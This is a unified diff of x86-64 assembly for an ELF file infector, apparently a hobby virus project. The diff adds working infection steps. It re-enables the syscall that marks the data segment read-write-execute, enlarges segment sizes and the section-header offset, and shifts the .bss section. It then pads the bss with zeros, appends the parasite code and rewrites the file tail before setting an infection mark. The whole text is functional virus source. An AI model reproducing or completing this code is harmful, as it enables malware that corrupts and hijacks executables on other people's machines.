@@ -90,7 +90,8 @@ infect:
 	sub rsp, 2 ;	SHNUM					RBP - 28	BYTE
 	sub rsp, 8 ;	INJECTED_OFFSET			RBP - 36	QWORD
 	sub rsp, 8 ;	INJECTED_ADDRESS		RBP - 44	QWORD
-	sub rsp, 4096 ; BUF						RSP + 0		PAGE_SIZE
+	sub rsp, 4 ;	BSS_LEN					RBP - 48	DWORD
+	sub rsp, 8192 ; BUF						RSP + 0		PAGE_SIZE
 	; ############################
 
 	; # READ AND SAVE HEADER INFO
@@ -142,8 +143,8 @@ infect:
 	syscall ; NUMBER OF BYTES READ STORED IN RAX
 
 	mov r10, rax ; WE WILL USE r10 TO STORE NUMBER OF READ BYTES
-	mov r8, 0 ; SETTING OUR COUNTER TO 8
-	cmp r10, 0x38 ; CHECK IF WE HAVE READ MORE THAN 1 HEADER STRUCT
+	mov r8, 0 ; SETTING OUR COUNTER TO R8
+	cmp r10, 0x38 ; CHECK IF WE HAVE READ MORE THAN 1 PHDR STRUCT
 	jl _infectEnd ; IF READ BYTES < SIZEOF PHDRSTRUCT, WEIRD FILE, END PARSING
 _segloop:
 	cmp byte[rsp+r8], 0x1 ; CHECK Phdr->p_type, must be == 1
@@ -164,6 +165,11 @@ _segloop:
 	mov rax, qword[rsp+r8+8+8+8+8+8] ; MOV Phdr->p_memsz for calculation
 	add qword[rbp-44], rax ; injected_address = Phdr->p_vaddr + Phdr->p_memsz;
 
+	; # CALCULATE BSS LENGTH
+	mov rax, qword[rsp+r8+8+8+8+8+8] ; MOV Phdr->p_memsz for calculation
+	sub rax, qword[rsp+r8+8+8+8+8] ; bss_len = Phdr->p_memsz - Phdr->p_filesz;
+	mov dword[rbp-48], eax ; SAVE BSS LENGTH
+
 	; # SET EXECUTE FLAG FOR DATA SEG
 	; LSEEK SYSCALL
 	; CALCULATE FLAG_OFFSET
@@ -181,7 +187,7 @@ _segloop:
 	push 0x00000007 ; RWE FLAG VALUE
 	lea rsi, [rsp]
 	mov rdx, 4 ; sizeof(uint32_t)
-	;syscall ; #TODO: Re-enable later
+	syscall
 	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
 
 	; # SET ENTRY POINT AT END OF DATA SEG
@@ -210,19 +216,201 @@ _segloop:
 	; REDIRECTING OUR VIRUS BY MODIFYING THE CODE AT RUNTIME, INSANE !
 
 	; # INCREASE DATA SEG SIZE
+	; LSEEK SYSCALL
+	; CALCULATE Phdr->p_filesz OFFSET
+	mov rsi, qword[rbp-8] ; PHDR_START
+	add rsi, r8 ; ADD TO PHDR_START OUR CURRENT STRUCT
+	add rsi, 4+4+8+8+8 ; Phdr->p_filesz
+	mov rdi, r9 ; FD
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rdx, 0 ; SEEK_SET
+	syscall
+	; # INCREASE FILESZ
+	mov rax, [rsp+r8+4+4+8+8+8] ; Phdr->p_filesz
+	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE SIZE
+	add eax, dword[rbp-48] ; ADD BSS SIZE
+	push rax
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	lea rsi, [rsp]
+	mov rdx, 8 ; sizeof(uint64_t)
+	syscall ; WRITE SYSCALL
+	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
+	; # INCREASE MEMSZ
+	mov rax, [rsp+r8+4+4+8+8+8+8] ; Phdr->p_memsz
+	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE SIZE
+	push rax
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	lea rsi, [rsp]
+	mov rdx, 8 ; sizeof(uint64_t)
+	syscall ; WRITE SYSCALL
+	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
 
-	; mov rax,rax ; # FOR DEBUG, REMOVE AFTER
-	; int 3 ; # SIG FOR DEBUG, REMOVE AFTER
+	; # INCREMENT Ehdr->shoff (section offset)
+	; LSEEK SYSCALL
+	mov rdi, r9 ; FD
+	mov rsi, 0x28 ; OFFSET FOR SHOFF
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rdx, 0 ; SEEK_SET
+	syscall
+	; WRITE SYSCALL
+	mov rax, qword[rbp-16] ; SHOFF
+	add eax, dword[rbp-48] ; BSS_LEN
+	add rax, _parasiteEnd - _parasiteStart ; PARASITE LEN
+	push rax ; SHOFF = SHOFF + PARASITE LEN + BSS LEN
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	lea rsi, [rsp]
+	mov rdx, 8 ; sizeof(uint64_t)
+	syscall
+	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
+
+	; # WE ARE DONE MODIFYING DATA SEGMENT !
 
 _segIterate:
 	add r8, 0x38 ; GO TO NEXT PHDR_STRUCT
 	cmp r8, r10 ; CHECK IF WE GO FURTHER THAN ALLOWED BYTES
 	jl _segloop
-	; int 3 ; BREAKPOINT FOR DEBUG
 
 	; ################
 
-	; call set_mark ; LET OUR INFECTED MARK
+	; # PARSE SECTIONS
+	; # LSEEK SYSCALL
+	mov rdi, r9 ; FD
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rsi, qword[rbp-16] ; SHDR_START
+	mov rdx, 0 ; SEEK_SET
+	syscall
+
+	; # READ SYSCALL
+	mov rax, 0
+	mov al, byte[rbp-28] ; MOV SHNUM TO RAX
+	mov rcx, 0x40 ; SIZEOF Elf64_Shdr STRUCT
+	mul rcx ; rax = rax * rcx
+	mov rdx, rax ; NUMBER OF CHARACTER TO READ (SHDR STRUCT * NUMBER OF STRUCT)
+	mov rdi, r9 ; FD
+	mov rax, 0 ; READ KERNEL CODE
+	lea rsi, [rsp] ; ADDR BUFFER
+	syscall ; NUMBER OF BYTES READ STORED IN RAX
+	mov r10, rax ; WE WILL USE r10 TO STORE NUMBER OF READ BYTES
+	mov r8, 0 ; SETTING OUR COUNTER TO R8
+	mov r11, 0 ; SETTING OUR FOUND ON/OFF IN R11
+	cmp r10, 0x40 ; CHECK IF WE HAVE READ MORE THAN 1 SHDR STRUCT
+	jl _infectEnd ; IF READ BYTES < SIZEOF SHDRSTRUCT, WEIRD FILE, END PARSING
+_secLoopFirstCheck:
+	cmp byte[rsp+r8+4], 8 ; CHECK IF Shdr->sh_type == SHT_NOBITS
+	jne _secLoopSndCheck
+	mov r11, 0x01
+	; # FOUND BSS SECTION
+_secLoopSndCheck:
+	cmp r11, 0x01
+	jne _secIterate
+	; # BSS SECTION HAS BEEN FOUND, MUST INCREMENT THIS SECTION OFFSET CODELEN+BSS
+	; # INCREMENTING sh_addr & offset by codelen + bss size
+	; LSEEK SYSCALL
+	; CALCULATE Shdr->sh_addr OFFSET
+	mov rsi, qword[rbp-16] ; SHDR_START
+	add rsi, r8 ; ADD TO SHDR_START OUR CURRENT STRUCT
+	add rsi, 4+4+8 ; Shdr->sh_addr
+	mov rdi, r9 ; FD
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rdx, 0 ; SEEK_SET
+	syscall
+	; # INCREASE SH_ADDR
+	mov rax, [rsp+r8+4+4+8] ; Shdr->sh_addr
+	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE SIZE
+	add eax, dword[rbp-48] ; ADD BSS SIZE
+	push rax
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	lea rsi, [rsp]
+	mov rdx, 8 ; sizeof(uint64_t)
+	syscall ; WRITE SYSCALL
+	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
+
+	; # INCREASE SH_OFFSET
+	mov rax, [rsp+r8+4+4+8+8] ; Phdr->sh_offset
+	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE SIZE
+	add eax, dword[rbp-48] ; ADD BSS SIZE
+	push rax
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	lea rsi, [rsp]
+	mov rdx, 8 ; sizeof(uint64_t)
+	syscall ; WRITE SYSCALL
+	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
+
+	; # WE ARE DONE MODIFYING SECTIONS !
+
+_secIterate:
+	add r8, 0x40
+	cmp r8, r10
+	jl _secLoopFirstCheck
+
+	; #############
+
+	; # MUST APPEND BSS + OUR PARASITE CODE NOW, SPOILER: THIS IS THE BEST PART
+
+	; # STORE POST PARASITE CODE IN BUFFER
+	; # LSEEK SYSCALL
+	mov rdi, r9 ; FD
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rsi, qword[rbp-36] ; INJECTED OFFSET
+	mov rdx, 0 ; SEEK_SET
+	syscall
+
+	; # READ SYSCALL
+	mov rdx, 8192 ; SIZE OF OUR BUFFER (2*PAGE_SIZE)
+	mov rdi, r9 ; FD
+	mov rax, 0 ; READ KERNEL CODE
+	lea rsi, [rsp] ; ADDR BUFFER
+	syscall ; NUMBER OF BYTES READ STORED IN RAX
+	mov r10, rax ; WE WILL USE r10 TO STORE NUMBER OF READ BYTES
+	cmp r10, 8192 ; CHECK IF THE REST OF THE FILE IS BIGGER THAN OUR BUFFER
+	jge _infectEnd ; #TODO MUST NOT F*CK THE FILE WHEN IT HAPPENS
+
+	; # LSEEK SYSCALL AGAIN
+	mov rdi, r9 ; FD
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rsi, qword[rbp-36] ; INJECTED OFFSET
+	mov rdx, 0 ; SEEK_SET
+	syscall
+
+	; # WRITE BSS SECTION IN THE FILE NOW
+	mov r8, 0 ; SETTING OUR COUNTER TO R8
+	cmp dword[rbp-48], 0x00 ; IF BSS LEN == 0
+	je _postLoop ; DONT WRITE BSS SECTION INTO THE FILE
+_writeLoop:
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	push 0x00 ; WRITE 0
+	lea rsi, [rsp]
+	mov rdx, 1 ; sizeof(uint32_t)
+	syscall ; WRITE SYSCALL
+	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
+	inc r8
+	cmp r8d, dword[rbp-48] ; CHECK IF COUNTER < BSS LEN
+	jl _writeLoop
+_postLoop:
+	; # FINISHED WRITING .bss SECTION
+
+	; # WRITE PARASITE CODE IN THE FILE
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	mov rsi, _parasiteStart ; ADDR OF THE BEGINNING OF OUR PARASITE
+	mov rdx, _parasiteEnd - _parasiteStart ; SIZE OF OUR PARASITE CODE
+	syscall ; WRITE SYSCALL
+
+	; REWRITE THE EOF
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	mov rsi, rsp ; READ BUFFER
+	mov rdx, r10 ; NUMBER OF BYTES TO REACH EOF
+	syscall ; WRITE SYSCALL
+	; ##########################
+
+	call set_mark ; LET OUR INFECTED MARK
 
 _infectEnd:
 	; # EPILOGUE
